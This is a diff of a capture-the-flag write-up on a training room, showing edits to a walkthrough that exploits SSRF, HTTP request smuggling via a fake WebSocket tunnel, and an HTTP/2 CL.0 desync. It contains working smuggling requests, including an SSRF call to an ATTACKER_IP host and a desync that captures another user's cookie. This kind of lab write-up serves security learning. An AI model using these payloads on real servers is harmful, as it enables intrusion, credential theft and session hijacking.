@@ -28,7 +28,7 @@ categories:
 The room acts as a final step of HTTP smuggling module, so, explored vulnerabilities are not surprising:
 
 - SSRF
-- HTTP request smuggling via fake WebSockets tunnel
+- HTTP request smuggling via fake WebSocket tunnel
 - HTTP request smuggling over HTTP 2 with CL.0 technique
 
 {{< toc >}} 
@@ -92,7 +92,7 @@ With these (and rerunning `nmap` with scripts) I concluded that this web app is 
 Second service must be accessed via HTTPS only and supports HTTP 2. Main page is linking to a JavaScript file:
 
 ```
-└─$ curl -ksi  https://10.10.146.124:80 
+$ curl -ksi  https://10.10.146.124:80 
 HTTP/2 200 
 date: Thu, 06 Mar 2025 21:42:47 GMT
 content-type: text/html; charset=utf-8
@@ -109,7 +109,7 @@ accept-ranges: bytes
 nothing to see <script src='/static/messages.js'></script>
 ```
 
-File `messages.js` shows chat functionality and two relevant endpoints:
+File `messages.js` shows chat functionality and two endpoints:
 
 ```js
 document.addEventListener("DOMContentLoaded", function () {
@@ -140,7 +140,7 @@ Going to `/getMessages` redirects to the login form.
 Knowing that the room is about HTTP smuggling, I was confident that I needed to [establish a fake WebSocket tunnel](https://github.com/0ang3el/websocket-smuggle). First, we need to trick the server to think that WebSocket service responds with 101 code. For that, I confirmed SSRF vulnerability in the status check API:
 
 ```bash
-└─$ curl -ksi 'http://MACHINE_IP:8080/isOnline?url=http://ATTACKER_IP:8000'
+$ curl -ksi 'http://MACHINE_IP:8080/isOnline?url=http://ATTACKER_IP:8000'
 HTTP/1.1 200 
 Server: nginx
 Date: Thu, 06 Mar 2025 21:57:55 GMT
@@ -178,7 +178,7 @@ if __name__ == '__main__':
 
 ```
 
-And to confirm successful request smuggling I crafted a request:
+And to confirm successful request smuggling I crafted a request to non-existing page:
 
 ```http
 GET /isOnline?url=http://ATTACKER_IP:8000/ws HTTP/1.1
@@ -188,10 +188,10 @@ Upgrade: WebSocket
 Connection: Upgrade
 Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
 
-GET /burn.html HTTP/1.1
+GET /toto HTTP/1.1
 Host: MACHINE_IP:8080
 
-
+ 
 ```
 
 ## Smuggling HTTP request to get the first flag
@@ -203,6 +203,8 @@ Host: MACHINE_IP:8080
 
 Smuggling request to `/trace` showed that there are two additional endpoints `/admin-creds` and `/admin-flag`.
 
+{{% tabs %}}
+{{% tab "Request" %}}
 ```http
 GET /isOnline?url=http://ATTACKER_IP:8000/ws HTTP/1.1
 Host: MACHINE_IP:8080
@@ -214,9 +216,11 @@ Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
 GET /trace HTTP/1.1
 Host: MACHINE_IP:8080
 
-
+ 
 ```
+{{% /tab %}}
 
+{{% tab "Response" %}}
 ```http
 HTTP/1.1 101 
 Server: nginx
@@ -236,9 +240,13 @@ Date: Fri, 07 Mar 2025 21:10:50 GMT
 
 
 ```
+{{% /tab %}}
+{{% /tabs %}}
 
 And smuggling request to `/admin-flag` reveals the first flag:
 
+{{% tabs %}}
+{{% tab "Request" %}}
 ```http
 GET /isOnline?url=http://ATTACKER_IP:8000/ws HTTP/1.1
 Host: MACHINE_IP:8080
@@ -250,9 +258,11 @@ Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
 GET /admin-flag HTTP/1.1
 Host: MACHINE_IP:8080
 
-
+ 
 ```
+{{% /tab %}}
 
+{{% tab "Response" %}}
 ```http
 HTTP/1.1 101 
 Server: nginx
@@ -268,12 +278,15 @@ Date: Fri, 07 Mar 2025 21:16:46 GMT
 
 THM{:::REDACTED:::}
 ```
-
+{{% /tab %}}
+{{% /tabs %}}
 
 ## HTTP 2 CL.0 desync to get the second flag
 
 Credentials from `/admin-creds` can be used to login into chat application:
 
+{{% tabs %}}
+{{% tab "Request" %}}
 ```http
 GET /isOnline?url=http://ATTACKER_IP:8000/ws HTTP/1.1
 Host: MACHINE_IP:8080
@@ -285,9 +298,11 @@ Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
 GET /admin-creds HTTP/1.1
 Host: MACHINE_IP:8080
 
-
+ 
 ```
+{{% /tab %}}
 
+{{% tab "Response" %}}
 ```http
 HTTP/1.1 101 
 Server: nginx
@@ -303,6 +318,8 @@ Date: Fri, 07 Mar 2025 21:15:49 GMT
 
 username:REDACTED password:REDACTED
 ```
+{{% /tab %}}
+{{% /tabs %}}
 
 ![Chat page with several loaded messages](ctf_elbandito_chat.png)
 
@@ -348,6 +365,8 @@ data=
 
 After playing a bit with smuggled request's `Content-Size` I got a user request containing the second flag as a cookie value:
 
+{{% tabs %}}
+{{% tab "Request" %}}
 ```http
 GET /getMessages HTTP/2
 Host: MACHINE_IP:80
@@ -365,7 +384,9 @@ Te: trailers
 
 
 ```
+{{% /tab %}}
 
+{{% tab "Response" %}}
 ```http
 HTTP/2 200 OK
 Date: Fri, 07 Mar 2025 22:01:08 GMT
@@ -383,6 +404,8 @@ Accept-Ranges: bytes
 {"JACK":["The Galactic Enforcement's quantum sniffers are onto us, tracing our blockchain exploits.","They're using predictive analytics, thinking they're ahead in a 4D chess game across the blockchain.","You need to jump now! Awaiting your signal to close the portal.",null,null,"njk",null,...SNIP..."GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"HeadlessChrome\";v=\"122\"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \"Linux\"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{\u00a1!\u00a1REDACTED!\u00a1!}\r\nX-Forwa",null],"OLIVER":[]}
 
 ```
+{{% /tab %}}
+{{% /tabs %}}
 
 > [!note]
 > You might need to try several times. HTTP smuggling isn't precise and can cause service disruption: I had to reboot the machine because the server kept dying.
